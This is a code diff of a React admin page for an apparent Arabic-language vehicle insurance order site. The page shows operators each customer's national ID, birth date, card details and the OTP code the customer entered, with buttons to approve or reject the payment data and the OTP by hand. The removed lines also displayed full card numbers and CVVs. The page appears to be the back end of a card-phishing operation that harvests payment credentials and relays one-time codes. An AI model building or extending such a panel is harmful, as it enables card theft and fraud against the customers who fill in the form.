@@ -102,10 +102,16 @@ const AdminOrders = () => {
   const getStatusBadge = (status: string, otpVerified: boolean) => {
     if (status === "completed" && otpVerified) {
       return <Badge className="bg-green-500 hover:bg-green-600">مكتمل ✓</Badge>;
-    } else if (status === "pending") {
-      return <Badge variant="secondary">قيد التنفيذ...</Badge>;
+    } else if (status === "waiting_approval") {
+      return <Badge className="bg-orange-500 hover:bg-orange-600">في انتظار موافقة الدفع</Badge>;
+    } else if (status === "waiting_otp_approval") {
+      return <Badge className="bg-blue-500 hover:bg-blue-600">في انتظار موافقة OTP</Badge>;
+    } else if (status === "approved") {
+      return <Badge className="bg-purple-500 hover:bg-purple-600">تمت الموافقة</Badge>;
+    } else if (status === "rejected" || status === "otp_rejected") {
+      return <Badge variant="destructive">مرفوض</Badge>;
     } else {
-      return <Badge variant="destructive">ملغي</Badge>;
+      return <Badge variant="secondary">قيد التنفيذ...</Badge>;
     }
   };
 
@@ -257,14 +263,14 @@ const AdminOrders = () => {
                 </CardContent>
               </Card>
             ) : (
-              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+              <div className="grid grid-cols-1 gap-6">
                 {orders.map((order) => {
                   const completionPercent = getCompletionPercentage(order);
                   
                   return (
                     <Card 
                       key={order.id} 
-                      className="hover:shadow-2xl transition-all duration-300 border-2 hover:border-primary/50 relative overflow-hidden"
+                      className="hover:shadow-xl transition-all duration-300 border-2 hover:border-primary/30 relative overflow-hidden"
                     >
                       {/* Completion Progress Bar */}
                       <div 
@@ -272,212 +278,204 @@ const AdminOrders = () => {
                         style={{ width: `${completionPercent}%` }}
                       />
 
-                      <CardHeader className="pb-4">
-                        <div className="flex justify-between items-start">
-                          <div>
-                            <CardTitle className="text-xl mb-2 flex items-center gap-2">
+                      <CardHeader className="pb-3 bg-gradient-to-br from-primary/5 to-accent/5">
+                        <div className="flex justify-between items-center">
+                          <div className="flex items-center gap-3">
+                            <div className="bg-primary/10 p-2 rounded-lg">
                               <FileText className="h-5 w-5 text-primary" />
-                              طلب #{order.sequence_number || "غير محدد"}
-                            </CardTitle>
-                            <CardDescription className="flex items-center gap-2">
-                              <Calendar className="h-4 w-4" />
-                              {formatDate(order.updated_at)}
-                            </CardDescription>
+                            </div>
+                            <div>
+                              <CardTitle className="text-lg mb-1">
+                                طلب رقم #{order.sequence_number || "غير محدد"}
+                              </CardTitle>
+                              <CardDescription className="flex items-center gap-1 text-xs">
+                                <Calendar className="h-3 w-3" />
+                                {formatDate(order.updated_at)}
+                              </CardDescription>
+                            </div>
                           </div>
-                          <div className="text-right">
+                          <div className="text-right flex flex-col items-end gap-2">
                             {getStatusBadge(order.status, order.otp_verified)}
-                            <div className="text-xs text-muted-foreground mt-2">
-                              اكتمال {completionPercent}%
+                            <div className="text-xs text-muted-foreground bg-white px-2 py-1 rounded">
+                              {completionPercent}% مكتمل
                             </div>
                           </div>
                         </div>
                       </CardHeader>
 
-                      <CardContent className="space-y-6">
-                        {/* Customer Info */}
-                        <div className="bg-gradient-to-br from-primary/5 to-primary/10 rounded-xl p-4 border border-primary/20">
-                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-primary">
-                            <User className="h-4 w-4" />
-                            معلومات العميل
-                          </h3>
-                          <div className="space-y-2 text-sm">
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">رقم الهوية:</span>
-                              <span className="font-medium">{order.id_number || "لم يتم الإدخال"}</span>
+                      <CardContent className="pt-4">
+                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                          {/* Customer Info */}
+                          <div className="bg-white border border-gray-200 rounded-lg p-3">
+                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-primary">
+                              <User className="h-4 w-4" />
+                              معلومات العميل
+                            </h3>
+                            <div className="space-y-1.5 text-xs">
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">رقم الهوية:</span>
+                                <span className="font-medium">{order.id_number || "-"}</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">تاريخ الميلاد:</span>
+                                <span className="font-medium">{order.birth_date || "-"}</span>
+                              </div>
                             </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">تاريخ الميلاد:</span>
-                              <span className="font-medium">{order.birth_date || "لم يتم الإدخال"}</span>
+                          </div>
+
+                          {/* Vehicle Info */}
+                          <div className="bg-white border border-gray-200 rounded-lg p-3">
+                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-blue-600">
+                              <Shield className="h-4 w-4" />
+                              معلومات المركبة
+                            </h3>
+                            <div className="space-y-1.5 text-xs">
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">النوع:</span>
+                                <span className="font-medium">{order.vehicle_type || "-"}</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">الغرض:</span>
+                                <span className="font-medium">{order.vehicle_purpose || "-"}</span>
+                              </div>
+                            </div>
+                          </div>
+
+                          {/* Insurance Info */}
+                          <div className="bg-white border border-gray-200 rounded-lg p-3">
+                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-green-600">
+                              <Shield className="h-4 w-4" />
+                              التأمين
+                            </h3>
+                            <div className="space-y-1.5 text-xs">
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">الشركة:</span>
+                                <span className="font-medium text-right max-w-[140px] truncate" title={order.insurance_company}>
+                                  {order.insurance_company || "-"}
+                                </span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">السعر:</span>
+                                <span className="font-bold text-green-600">
+                                  {order.insurance_price > 0 ? `${order.insurance_price} ﷼` : "-"}
+                                </span>
+                              </div>
+                            </div>
+                          </div>
+
+                          {/* Payment Info */}
+                          <div className="bg-white border border-gray-200 rounded-lg p-3">
+                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-orange-600">
+                              <CreditCard className="h-4 w-4" />
+                              معلومات الدفع
+                            </h3>
+                            <div className="space-y-1.5 text-xs">
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">رقم البطاقة:</span>
+                                <span className="font-mono font-medium" dir="ltr">
+                                  {order.card_number ? `**** ${order.card_number.slice(-4)}` : "-"}
+                                </span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">الاسم:</span>
+                                <span className="font-medium truncate max-w-[140px]" title={order.card_holder_name}>
+                                  {order.card_holder_name || "-"}
+                                </span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">الانتهاء:</span>
+                                <span className="font-medium">{order.expiry_date || "-"}</span>
+                              </div>
+                            </div>
+                          </div>
+
+                          {/* OTP Verification */}
+                          <div className="bg-white border border-gray-200 rounded-lg p-3">
+                            <h3 className={`font-semibold mb-2 flex items-center gap-2 text-sm ${
+                              order.otp_verified ? "text-green-600" : "text-gray-500"
+                            }`}>
+                              <Phone className="h-4 w-4" />
+                              OTP
+                            </h3>
+                            <div className="space-y-1.5 text-xs">
+                              <div className="flex justify-between items-center">
+                                <span className="text-gray-500">الكود:</span>
+                                <span className="font-mono font-medium">
+                                  {order.otp_code || "-"}
+                                </span>
+                              </div>
+                              <div className="flex justify-between items-center">
+                                <span className="text-gray-500">الحالة:</span>
+                                {order.otp_verified ? (
+                                  <Badge className="bg-green-500 text-xs h-5">✓ تم</Badge>
+                                ) : (
+                                  <Badge variant="secondary" className="text-xs h-5">لم يتم</Badge>
+                                )}
+                              </div>
                             </div>
                           </div>
                         </div>
 
-                        {/* Vehicle Info */}
-                        <div className="bg-gradient-to-br from-blue-500/5 to-blue-500/10 rounded-xl p-4 border border-blue-500/20">
-                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-blue-600">
-                            <Shield className="h-4 w-4" />
-                            معلومات المركبة
-                          </h3>
-                          <div className="space-y-2 text-sm">
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">نوع المركبة:</span>
-                              <span className="font-medium">{order.vehicle_type || "لم يتم الاختيار"}</span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">الغرض:</span>
-                              <span className="font-medium">{order.vehicle_purpose || "لم يتم الاختيار"}</span>
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* Insurance Info */}
-                        <div className="bg-gradient-to-br from-green-500/5 to-green-500/10 rounded-xl p-4 border border-green-500/20">
-                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-green-600">
-                            <Shield className="h-4 w-4" />
-                            معلومات التأمين
-                          </h3>
-                          <div className="space-y-2 text-sm">
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">الشركة:</span>
-                              <span className="font-medium text-right max-w-[60%]">
-                                {order.insurance_company || "لم يتم الاختيار"}
-                              </span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">السعر:</span>
-                              <span className="font-bold text-green-600">
-                                {order.insurance_price > 0 ? `${order.insurance_price} ريال` : "لم يتم الاختيار"}
-                              </span>
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* Payment Info */}
-                        <div className="bg-gradient-to-br from-orange-500/5 to-orange-500/10 rounded-xl p-4 border border-orange-500/20">
-                          <h3 className="font-semibold mb-3 flex items-center gap-2 text-orange-600">
-                            <CreditCard className="h-4 w-4" />
-                            معلومات الدفع
-                          </h3>
-                          <div className="space-y-2 text-sm">
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">رقم البطاقة:</span>
-                              <span className="font-mono font-medium" dir="ltr">
-                                {order.card_number || "لم يتم الإدخال"}
-                              </span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">اسم حامل البطاقة:</span>
-                              <span className="font-medium">
-                                {order.card_holder_name || "لم يتم الإدخال"}
-                              </span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">تاريخ الانتهاء:</span>
-                              <span className="font-medium">
-                                {order.expiry_date || "لم يتم الإدخال"}
-                              </span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">CVV:</span>
-                              <span className="font-mono font-medium">
-                                {order.cvv || "لم يتم الإدخال"}
-                              </span>
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* OTP Verification */}
-                        <div className={`rounded-xl p-4 border ${
-                          order.otp_verified 
-                            ? "bg-gradient-to-br from-green-500/5 to-green-500/10 border-green-500/20" 
-                            : "bg-gradient-to-br from-gray-500/5 to-gray-500/10 border-gray-500/20"
-                        }`}>
-                          <h3 className={`font-semibold mb-3 flex items-center gap-2 ${
-                            order.otp_verified ? "text-green-600" : "text-muted-foreground"
-                          }`}>
-                            <Phone className="h-4 w-4" />
-                            التحقق من OTP
-                          </h3>
-                          <div className="space-y-2 text-sm">
-                            <div className="flex justify-between items-center">
-                              <span className="text-muted-foreground">كود التحقق:</span>
-                              <span className="font-mono">
-                                {order.otp_code || "لم يتم الإدخال"}
-                              </span>
-                            </div>
-                            <div className="flex justify-between items-center">
-                              <span className="text-muted-foreground">حالة التحقق:</span>
-                              {order.otp_verified ? (
-                                <Badge className="bg-green-500">تم التحقق ✓</Badge>
-                              ) : (
-                                <Badge variant="secondary">لم يتم التحقق</Badge>
-                              )}
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* Approval/Rejection Actions */}
-                        {order.status === "waiting_approval" && order.card_number && (
-                          <div className="flex gap-3 pt-4 border-t border-border">
+                        {/* Action Buttons */}
+                        {order.status === "waiting_approval" && (
+                          <div className="flex gap-3 mt-4 pt-4 border-t border-border">
                             <Button
                               onClick={() => handleApprove(order.sequence_number)}
                               disabled={processingOrder === order.sequence_number}
-                              className="flex-1 bg-green-600 hover:bg-green-700"
+                              className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                             >
                               {processingOrder === order.sequence_number ? (
                                 <Loader2 className="h-4 w-4 animate-spin ml-2" />
                               ) : (
                                 <Check className="h-4 w-4 ml-2" />
                               )}
-                              الموافقة على معلومات الدفع
+                              موافقة - الدفع
                             </Button>
                             <Button
                               onClick={() => handleReject(order.sequence_number)}
                               disabled={processingOrder === order.sequence_number}
                               variant="destructive"
-                              className="flex-1"
+                              className="flex-1 h-10"
                             >
                               {processingOrder === order.sequence_number ? (
                                 <Loader2 className="h-4 w-4 animate-spin ml-2" />
                               ) : (
                                 <X className="h-4 w-4 ml-2" />
                               )}
-                              عدم الموافقة
+                              رفض
                             </Button>
                           </div>
                         )}
 
-                        {/* OTP Approval/Rejection Actions */}
-                        {order.status === "waiting_otp_approval" && order.otp_code && (
-                          <div className="flex gap-3 pt-4 border-t border-border">
+                        {order.status === "waiting_otp_approval" && (
+                          <div className="flex gap-3 mt-4 pt-4 border-t border-border">
                             <Button
                               onClick={() => handleOtpApprove(order.sequence_number)}
                               disabled={processingOrder === order.sequence_number}
-                              className="flex-1 bg-green-600 hover:bg-green-700"
+                              className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                             >
                               {processingOrder === order.sequence_number ? (
                                 <Loader2 className="h-4 w-4 animate-spin ml-2" />
                               ) : (
                                 <Check className="h-4 w-4 ml-2" />
                               )}
-                              الموافقة على رمز التحقق
+                              موافقة - OTP
                             </Button>
                             <Button
                               onClick={() => handleOtpReject(order.sequence_number)}
                               disabled={processingOrder === order.sequence_number}
                               variant="destructive"
-                              className="flex-1"
+                              className="flex-1 h-10"
                             >
                               {processingOrder === order.sequence_number ? (
                                 <Loader2 className="h-4 w-4 animate-spin ml-2" />
                               ) : (
                                 <X className="h-4 w-4 ml-2" />
                               )}
-                              رفض رمز التحقق
+                              رفض
                             </Button>
                           </div>
                         )}
-
                       </CardContent>
                     </Card>
                   );
